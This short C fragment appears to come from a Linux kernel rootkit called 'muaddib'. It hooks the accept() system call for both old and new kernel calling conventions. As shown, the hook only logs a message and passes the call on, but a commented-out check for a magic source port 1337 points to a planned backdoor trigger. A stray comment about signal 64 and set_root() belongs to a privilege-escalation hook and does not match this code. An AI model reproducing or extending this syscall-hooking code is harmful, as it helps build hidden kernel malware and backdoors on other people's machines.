//#include "accept_hook.h"

#ifdef PTREGS_SYSCALL_STUBS

#define SRCPORT 1337

static asmlinkage long (*og_accept)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int muaddib_accept(const struct pt_regs *regs){

    //struct sockaddr_in __user* sock_in;//  = (struct sockaddr_in *)regs->si;
    //copy_from_user(sock_in, (struct sockaddr_in *)regs->si, sizeof(struct sockaddr_in));

    //if (ntohs(sock_in->sin_port) == SRCPORT) {
        //printk("Port matches!");
    //}

    printk("accept hooked :)");
    return og_accept(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*og_accept)(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen);

static asmlinkage int muaddib_accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen){
    printk("accept hooked :)");
    return og_accept(sockfd, addr, addrlen);
}
#endif
